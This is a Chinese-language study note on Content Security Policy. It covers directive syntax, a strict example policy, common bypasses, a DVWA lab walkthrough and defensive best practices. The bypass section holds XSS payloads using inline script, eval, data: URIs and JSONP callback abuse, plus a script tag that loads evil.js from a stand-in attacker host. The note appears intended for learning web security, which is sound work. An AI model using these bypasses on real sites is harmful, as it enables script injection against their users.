# 内容安全策略（CSP）绕过

1.CSP 绕过定义：本质是利用**配置错误、浏览器特性、注入点上下文**，在白名单内执行恶意脚本，核心是 “找合法入口、借合法路径、用合法语法” 执行攻击代码。下面按常见场景分类，给出可复现的绕过方法、原理与防御要点。

2.CSP定义：是一中高效的防御策略，**使这个网页只允许加载我指定的脚本、样式、图片等资源，其他来源一律禁止。**目的是**大幅降低 XSS 攻击风险**，也能防御点击劫持等攻击。（一个浏览器级别的白名单）

## 3.csp防御的常用指令参考

1.详细见网页：[内容安全策略（CSP）头快速引用](https://content-security-policy.com/)

2.格式

```php
Content-Security-Policy: 指令1 值1 值2; 指令2 值1 值2;
```

**头名固定**：`Content-Security-Policy`

**指令 + 值** 之间用**空格**分开

**多个指令**之间用 **分号；** 分开

**值可以写多个**，用空格分开(想几个写几个)

（值）**关键字必须加单引号**：`'self'` `'none'` `'unsafe-inline'`

**（值）域名 / 协议不加单引号**：`https://cdn.com` `data:` `https:`

3.指令见网页

4.值如下表（使用规则也如bi）：

| 来源价值                                                     | 示例                                         | 描述                                                         |
| :----------------------------------------------------------- | :------------------------------------------- | :----------------------------------------------------------- |
| `*`                                                          | `img-src *`                                  | 万用卡，允许除数据外的任何URL：blob：文件系统：schemes。     |
| [`'none'`](https://content-security-policy.com/none/)        | `object-src 'none'`                          | 防止从任何来源加载资源。                                     |
| [`'self'`](https://content-security-policy.com/self/)        | `script-src 'self'`                          | 允许从同一起点（相同方案、主机和端口）加载资源。             |
| `data:`                                                      | `img-src 'self' data:`                       | 允许通过数据方案加载资源（例如Base64编码图像）。             |
| `*domain.example.com*`                                       | `img-src domain.example.com`                 | 允许从指定域名加载资源。                                     |
| `**.example.com*`                                            | `img-src *.example.com`                      | 允许从任意子域加载资源。`*example.com*`                      |
| `*https://cdn.com*`                                          | `img-src https://cdn.com`                    | 允许仅通过与指定域名匹配的HTTPS加载资源。                    |
| `https:`                                                     | `img-src https:`                             | 允许在任何域上仅通过HTTPS加载资源。                          |
| [`'unsafe-inline'`](https://content-security-policy.com/unsafe-inline/) | `script-src 'unsafe-inline'`                 | 允许使用内联源元素，如样式属性、点击标签或脚本标签体（取决于应用源的上下文）以及 URI`javascript:` |
| `'unsafe-eval'`                                              | `script-src 'unsafe-eval'`                   | 允许不安全的动态代码评估，如JavaScript`eval()`               |
| [`'sha256-'`](https://content-security-policy.com/hash/)     | `script-src 'sha256-xyz...'`                 | 允许内联脚本或CSS执行，前提是其哈希值与头部指定的哈希值匹配。目前支持 SHA256、SHA384 或 SHA512。CSP二级 |
| [`'nonce-'`](https://content-security-policy.com/nonce/)     | `script-src 'nonce-rAnd0m'`                  | 允许内联脚本或CSS执行，前提是脚本（例如：）标签包含与CSP头中指定的nonce属性相符的nonce属性。nonce 应为安全的随机字符串，不应重复使用。`<script nonce="rAnd0m">`CSP二级 |
| [`'strict-dynamic'`](https://content-security-policy.com/strict-dynamic/) | `script-src 'strict-dynamic'`                | 允许脚本通过非“解析器插入”的脚本元素加载额外脚本（例如允许）。`document.createElement('script');`CSP三级 |
| [`'unsafe-hashes'`](https://content-security-policy.com/unsafe-hashes/) | `script-src 'unsafe-hashes' 'sha256-abc...'` | 允许你在事件处理程序中启用脚本（例如 ）。不适用于或内联`onclick``javascript:``<script>` CSP三级 |

2.这些是 CSP 里最常用的 “开关”：

1. **`'self'`**

   → 只允许**本站**资源

2. **`'none'`**

   → **完全禁止**（最安全）

3. **`'unsafe-inline'`**

   → 允许**内联脚本**

   → ❌ 危险，XSS 能直接执行

4. **`'unsafe-eval'`**

   → 允许 `eval()` 动态执行代码

   → ❌ 非常危险

------

#### 一个最简单的安全 CSP 例子

plaintext

```php
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  img-src 'self';
  connect-src 'self';
  object-src 'none';
  frame-ancestors 'none';
```

翻译：

- 默认只允许本站
- JS、图片、请求都只能来自本站
- 禁止插件
- 禁止别人内嵌我（防点击劫持）

## 4. CSP 绕过

### 1.最常见：配置宽松导致的直接绕过

1 允许 `'unsafe-inline'`（允许嵌入）

**绕过**：直接注入内联脚本或事件处理器

eg:

```php+HTML
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

2.允许 `'unsafe-eval'`（动态代码执行）

**绕过**：用 `eval` / `new Function` / `setTimeout` 执行可控字符串

```javascript
eval("alert(1)");
setTimeout("alert(1)", 0);
```

3.允许 `data:` 协议(允许通过数据方案加载资源,能跑自己的脚本)

**绕过**：用 `data:text/javascript,...` 嵌入脚本

```php
<script src="data:text/javascript,alert(1)"></script>
```

4.允许https://*过宽的域名 / 通配符

**绕过**：在被允许的子域 / 可信第三方托管恶意 JS

<script src="https://attacker-controlled.example.com/evil.js"></script>

### 2.还有其他，高级的绕过后面学

## 5.DVWA实战

1.中级防御：

```php
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
```

解释：'self'：只允许访问本网站的文件

​            'unsafe-inline'：可嵌入代码

​            nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='  ：  只有带这个 TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA= 字符串作为 nonce 属性的内联脚本，才会被浏览器允许执行。（错一个也不行）

2.中级绕过：直接在输入框中嵌入代码

```php
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">
alert(1);
</script>
```

3.高级防御：

```php
$headerCSP = "Content-Security-Policy: script-src 'self';";
```

self'：只允许访问本网站的文件

4.高级防御漏洞点

（1）XSS注入：

```php
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= $_POST['include'];
}
$page[ 'body' ] .= '
这里面所有的内容，都会直接显示在网页上
';
```

代码解释：不管post表单传什么值，然后它返回的变量$page[ 'body' ]=都会把post表单的值原封不动的，展现出来

绕过方法：直接BP抓包修改post表单，然后进行xss漏洞注入

（2）JAVA strict接口

```php
<script src="source/high.js"></script>
```

```php
s.src = "source/jsonp.php?callback=solveSum";
```

代码解释:这两个是调用JAVA strict代码，然后你交的post表单，你可以自己修改值，假设，你已经知道它的调用格式是怎么样的，还有它的调用文件名是怎么样的，你可以直接构造一个post表单嗯，对这两个JavaScript文件进行调用，并在他们后面加上你的恶意代码，因为该网站的防护只做了，运行本网站文件。所以说当你的post表单中有这两个文件名的时候，它就会自动绕过自动执行。不管你后面写的是什么，它都会执行

绕过

```php
<script src="source/jsonp.php?callback=alert(1)"></script> 
```



## 6.防御 CSP 绕过的最佳实践

1. **最小权限原则**：`default-src 'none'`，再逐个开放必要源
2. **禁用危险关键字**：**绝对不用** `'unsafe-inline'`、`'unsafe-eval'`、`data:`
3. **用 Nonce/Hash 管控内联**：Nonce 每次请求随机，Hash 仅用于固定脚本
4. **限制第三方源**：白名单精确到域名 / 路径，定期审计
5. **启用 CSP 报告**：`report-uri /csp-report` 监控违规，先 `Report-Only` 再强制执行
6. **补充防护**：`<base>` 限制、上传目录禁执行、JSONP / 重定向严格校验、XSS 过滤